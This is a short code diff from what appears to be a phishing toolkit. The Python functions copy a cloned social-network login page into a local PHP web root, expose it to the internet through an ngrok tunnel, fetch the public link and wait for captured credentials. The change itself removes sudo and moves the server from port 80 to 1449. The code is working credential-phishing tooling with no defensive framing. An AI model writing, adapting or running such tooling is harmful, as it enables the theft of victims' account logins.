@@ -15,7 +15,7 @@ from time import sleep
 from huepy import *
 
 def runPhishing(social):
-    system('sudo rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')
+    system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')
     command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
     system(command)
 
@@ -30,7 +30,7 @@ def waitCreds():
         creds.close()
 
 def runNgrok():
-    system('./base/Server/ngrok http 80 > /dev/null &')
+    system('./base/Server/ngrok http 1449 > /dev/null &')
     sleep(10)
     system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
@@ -38,6 +38,4 @@ def runNgrok():
     url.close()
 
 def runServer():
-    system("cd base/Server/www/ && sudo php -S 127.0.0.1:80 > /dev/null 2>&1 &")
-
-
+    system("cd base/Server/www/ && php -S 127.0.0.1:1449 > /dev/null 2>&1 &")
